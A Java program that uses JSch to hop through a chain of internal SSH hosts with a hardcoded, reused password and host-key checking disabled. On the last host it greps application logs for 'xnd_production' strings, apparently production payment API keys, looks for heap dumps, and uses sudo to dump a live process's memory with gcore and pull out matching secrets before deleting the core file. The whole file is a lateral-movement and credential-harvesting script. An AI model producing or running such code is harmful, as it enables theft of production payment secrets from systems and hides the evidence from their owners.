import com.jcraft.jsch.*;
import java.io.*;
class FR3 {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s1 = j.getSession("user", "10.14.36.23", 22);
    s1.setPassword("kutul0nc4t");
    s1.setConfig(p);
    s1.setTimeout(10000);
    s1.connect();
    int fwd1 = s1.setPortForwardingL(0, "10.13.16.117", 22);
    Session s2 = j.getSession("user", "127.0.0.1", fwd1);
    s2.setPassword("kutul0nc4t");
    s2.setConfig(p);
    s2.setTimeout(8000);
    s2.connect();
    ChannelExec ch = (ChannelExec) s2.openChannel("exec");
    ch.setCommand("sshpass -p kutul0nc4t ssh -o StrictHostKeyChecking=no user@10.13.16.196 'echo ---NEO-LOGS-XENDIT---;grep -c xnd_production /progs/neo/neo-app/tomcat/8.0.53/logs/catalina.out 2>/dev/null;grep xnd_production /progs/neo/neo-app/tomcat/8.0.53/logs/catalina.out 2>/dev/null | tail -3;echo ---TMP-HEAPDUMPS---;find /tmp /progs/neo/ -name \"*.hprof\" -o -name \"heapdump*\" 2>/dev/null | head -5;echo ---JMAP-HISTO---;echo kutul0nc4t | sudo -S /usr/lib/jvm/java-1.8.0-amazon-corretto/bin/jmap -histo:live 789 2>&1 | grep -i xendit | head -5;echo ---GDB-MEM---;echo kutul0nc4t | sudo -S bash -c \"gcore -o /tmp/neo_core 789 2>/dev/null && strings /tmp/neo_core.789 2>/dev/null | grep xnd_production | sort -u | head -10 && rm -f /tmp/neo_core.789\" 2>&1 | head -15' 2>&1 | head -40");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[16384];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s2.disconnect();
    s1.disconnect();
  }
}
